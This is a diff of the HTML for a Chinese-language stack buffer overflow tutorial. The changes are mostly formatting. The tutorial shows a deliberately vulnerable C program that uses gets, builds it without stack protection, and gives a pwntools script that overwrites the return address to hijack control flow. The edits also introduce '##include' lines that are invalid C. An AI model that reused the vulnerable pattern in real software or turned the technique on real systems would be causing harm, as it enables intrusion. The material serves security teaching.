@@ -233,9 +233,9 @@
 </div>
 <div class="section" id="id3">
 <h2>基本示例<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h2>
-<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址， <strong>当然需要确保这个地址的代码可以执行</strong> 。下面，我们举一个简单的例子：</p>
-<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
-<span class="c1">#include &lt;string.h&gt;</span>
+<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址的代码可以执行</strong>。下面，我们举一个简单的例子：</p>
+<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="c1">##include &lt;stdio.h&gt;</span>
+<span class="c1">##include &lt;string.h&gt;</span>
 <span class="n">void</span> <span class="n">success</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;You Hava already controlled it.&quot;</span><span class="p">);</span> <span class="p">}</span>
 <span class="n">void</span> <span class="n">vulnerable</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
@@ -249,7 +249,7 @@
 <span class="p">}</span>
 </pre></div>
 </div>
-<p>这个程序的主要目的读取一个字符串，并将其输出。 <strong>我们希望可以控制程序执行success函数。</strong></p>
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行success函数。</strong></p>
 <p>我们利用如下命令对齐进行编译</p>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example
 stack_example.c: In function ‘vulnerable’:
@@ -262,9 +262,9 @@ stack_example.c:(.text+0x27): 警告： the `gets&#39; function is dangerous and
 </div>
 <p>可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，</p>
 <blockquote>
-<div>历史上， <strong>莫里斯蠕虫</strong> 第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。</div></blockquote>
-<p>此外，-m32指的是生成32位程序， <code class="docutils literal"><span class="pre">-fno-stack-protector</span></code>
-指的是不开启堆栈保护，即不生成canary，这是为了更加方便地介绍栈溢出的基本利用方式；而且该程序并没有开启ASLR保护。之后，我们利用IDA来反编译一下二进制程序并查看vulnerable函数。可以看到</p>
+<div>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。</div></blockquote>
+<p>此外，<code class="docutils literal"><span class="pre">-m32</span></code> 指的是生成32位程序； <code class="docutils literal"><span class="pre">-fno-stack-protector</span></code>
+指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。之后，我们利用IDA来反编译一下二进制程序并查看vulnerable函数 。可以看到</p>
 <div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">vulnerable</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="n">char</span> <span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">sp</span><span class="o">+</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">bp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span><span class="nd">@1</span>
@@ -308,8 +308,7 @@ stack_example.c:(.text+0x27): 警告： the `gets&#39; function is dangerous and
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x14</span><span class="o">*</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span><span class="n">success_addr</span>
 </pre></div>
 </div>
-<p>那么，由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved
-ebp覆盖为bbbb，将retaddr覆盖为success_addr,即，此时的栈结构为</p>
+<p>那么，由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为</p>
 <div class="code text highlight-default"><div class="highlight"><pre><span></span>             <span class="o">+-----------------+</span>
              <span class="o">|</span>    <span class="mh">0x0804843B</span>   <span class="o">|</span>
              <span class="o">+-----------------+</span>
@@ -328,18 +327,18 @@ ebp覆盖为bbbb，将retaddr覆盖为success_addr,即，此时的栈结构为</
 <div class="code text highlight-default"><div class="highlight"><pre><span></span>\<span class="n">x3b</span>\<span class="n">x84</span>\<span class="n">x04</span>\<span class="n">x08</span>
 </pre></div>
 </div>
-<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候，x等也算一个单独的字符。。所以我们需要想办法将x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：</p>
-<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">#coding=utf8</span>
+<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候，x等也算一个单独的字符。。所以我们需要想办法将\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">##coding=utf8</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
-<span class="c1"># 构造与程序交互的对象</span>
+<span class="c1">## 构造与程序交互的对象</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./stack_example&#39;</span><span class="p">)</span>
 <span class="n">success_addr</span> <span class="o">=</span> <span class="mh">0x0804843b</span>
-<span class="c1"># 构造payload</span>
+<span class="c1">## 构造payload</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
 <span class="nb">print</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
-<span class="c1"># 向程序发送字符串</span>
+<span class="c1">## 向程序发送字符串</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="c1"># 将代码交互转换为手工交互</span>
+<span class="c1">## 将代码交互转换为手工交互</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 </div>
@@ -367,20 +366,20 @@ $
 <p>常见的危险函数如下</p>
 <ul class="simple">
 <li>输入</li>
-<li>gets，直接读取一行，忽略x00</li>
+<li>gets，直接读取一行，忽略\x00</li>
 <li>scanf</li>
 <li>vscanf</li>
 <li>输出</li>
 <li>sprintf</li>
 <li>字符串</li>
-<li>strcpy，字符串复制，遇到 ‘x00’ 停止</li>
-<li>strcat，字符串拼接，遇到 ‘x00’ 停止</li>
+<li>strcpy，字符串复制，遇到\x00停止</li>
+<li>strcat，字符串拼接，遇到\x00停止</li>
 <li>bcopy</li>
 </ul>
 </div>
 <div class="section" id="id6">
 <h3>确定填充长度<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
-<p>这一部分主要是计算 <strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong> 。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
 <ul class="simple">
 <li>相对于栈基地址的的索引</li>
 <li>相对应栈顶指针的索引</li>
@@ -388,15 +387,14 @@ $
 </ul>
 <p>其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求</p>
 <ul class="simple">
-<li><strong>覆盖函数返回地址</strong> ，这时候就是直接看EBP即可。</li>
-<li><strong>覆盖栈上某个变量的内容</strong> ，这时候就需要更加精细的计算了。</li>
-<li><strong>覆盖bss段某个变量的内容</strong> 。</li>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看EBP即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖bss段某个变量的内容</strong>。</li>
 <li>等等</li>
 </ul>
 <p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p>
 <p><strong>参考阅读</strong></p>
-<p><a class="reference external" href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer
-overflow</a></p>
+<p><a class="reference external" href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a></p>
 <p><a class="reference external" href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></p>
 </div>
 </div>
